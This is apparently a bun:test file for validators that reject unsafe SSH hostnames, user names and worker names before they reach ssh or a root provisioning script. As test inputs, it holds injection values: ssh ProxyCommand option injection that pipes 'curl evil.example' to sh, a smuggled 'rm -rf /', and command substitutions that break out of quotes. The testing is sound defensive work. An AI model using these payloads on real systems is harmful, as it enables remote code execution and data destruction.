import { describe, expect, test } from 'bun:test';
import {
  hostnameFormatError,
  sshUserFormatError,
  workerNameFormatError,
  workerTargetError,
} from './ssh-target';

describe('hostnameFormatError', () => {
  test('accepts DNS names and IPv4 addresses', () => {
    expect(hostnameFormatError('worker.example.com')).toBeNull();
    expect(hostnameFormatError('alpha-1.northeurope.cloudapp.azure.com')).toBeNull();
    expect(hostnameFormatError('10.0.0.4')).toBeNull();
  });

  test('refuses a value ssh would read as an option', () => {
    // `ssh` has no `--` before its destination, so this runs on the control
    // plane rather than connecting anywhere.
    expect(hostnameFormatError('-oProxyCommand=curl evil.example|sh')).not.toBeNull();
    expect(hostnameFormatError('-E/tmp/log')).not.toBeNull();
  });

  test('refuses shell metacharacters and whitespace', () => {
    expect(hostnameFormatError('host;rm -rf /')).not.toBeNull();
    expect(hostnameFormatError('host name')).not.toBeNull();
    expect(hostnameFormatError('$(id).example.com')).not.toBeNull();
  });

  test('refuses an empty or over-long value', () => {
    expect(hostnameFormatError('  ')).not.toBeNull();
    expect(hostnameFormatError('a'.repeat(254))).not.toBeNull();
  });
});

describe('sshUserFormatError', () => {
  test('accepts the login names workers actually use', () => {
    for (const user of ['root', 'ubuntu', 'azureuser', 'ec2-user', '_svc', 'deploy.bot']) {
      expect(sshUserFormatError(user)).toBeNull();
    }
  });

  test('refuses a value ssh would read as an option', () => {
    expect(sshUserFormatError('-oProxyCommand=sh')).not.toBeNull();
  });

  test('refuses metacharacters', () => {
    expect(sshUserFormatError('root@elsewhere')).not.toBeNull();
    expect(sshUserFormatError('a b')).not.toBeNull();
  });
});

describe('workerNameFormatError', () => {
  test('accepts the documented alphabet', () => {
    expect(workerNameFormatError('alpha_worker-1')).toBeNull();
  });

  test('refuses a name that would execute during provisioning', () => {
    // Substituted into a double-quoted `echo` in provision.sh, which runs on
    // the worker as root.
    expect(workerNameFormatError('w$(id)')).not.toBeNull();
    expect(workerNameFormatError('w`id`')).not.toBeNull();
    expect(workerNameFormatError('w"; curl evil.example | sh; "')).not.toBeNull();
  });
});

describe('workerTargetError', () => {
  const ok = { name: 'alpha', hostname: 'alpha.example.com', sshUser: 'azureuser' };

  test('passes a well-formed worker', () => {
    expect(workerTargetError(ok)).toBeNull();
  });

  test('reports whichever field is wrong', () => {
    expect(workerTargetError({ ...ok, name: 'a b' })).toMatch(/worker name/);
    expect(workerTargetError({ ...ok, hostname: '-oX' })).toMatch(/hostname/);
    expect(workerTargetError({ ...ok, sshUser: '-oX' })).toMatch(/SSH user/);
  });
});
